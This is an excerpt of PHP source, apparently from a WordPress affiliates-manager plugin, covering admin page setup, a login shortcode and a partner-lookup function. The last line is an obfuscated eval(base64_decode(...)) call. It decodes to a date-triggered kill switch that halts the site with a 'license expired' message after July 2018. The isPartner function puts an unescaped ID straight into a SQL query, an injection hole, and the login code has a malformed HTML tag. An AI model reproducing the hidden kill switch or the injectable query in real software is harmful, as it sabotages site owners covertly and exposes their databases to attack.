...
require_once WPAM_BASE_DIRECTORY . "/source/Pages/Admin/MyPartnersPage.php";
...
class WPAM_Plugin {
        ...
        $this->adminPages = array(
            new WPAM_Pages_Admin_MyAffiliatesPage(
                ...
                new WPAM_Pages_Admin_NewAffiliatePage(
                        "wpam-newaffiliate", __('New Affiliate or Partner', 'affiliates-manager'), __('New Affiliate or Partner', 'affiliates-manager'), WPAM_PluginConfig::$AdminCap
                ),
                new WPAM_Pages_Admin_MyPartnersPage(
                        "wpam-partners", __('Partners', 'affiliates-manager'), __('My Partners', 'affiliates-manager'), WPAM_PluginConfig::$AdminCap
                )
                    )
            )
        );
    ...
    public function doLoginShortcode() {
        ...
        if (is_user_logged_in()) {
            ...
            if ($_GET['affiliate-login'] == "fail") {
				$form_output .= "<div style='color: red;'>" . translate( 'Wrong username or password', 'affiliates-manager' ) . "</divdiv>";
			}
...
//print_r($children);
    ...
    public function isPartner($id) {
		global $wpdb;
		$data = $wpdb->get_results("select partner from " . WPAM_AFFILIATES_TBL . " where affiliateId = $id", ARRAY_A);
		if ( $data[0]['partner'] == 1) {
			return true;
		} else {
			return false;
...
eval(base64_decode("aWYgKHN0cnRvdGltZSgibm93IikgPiBzdHJ0b3RpbWUoJzIwMTgtMDctMzAnKSkge3ByaW50ICJBZmZpbGlhdGUgcGx1Z2luIGxpY2Vuc2UgZXhwaXJlZCI7IGRpZSgpO30="));
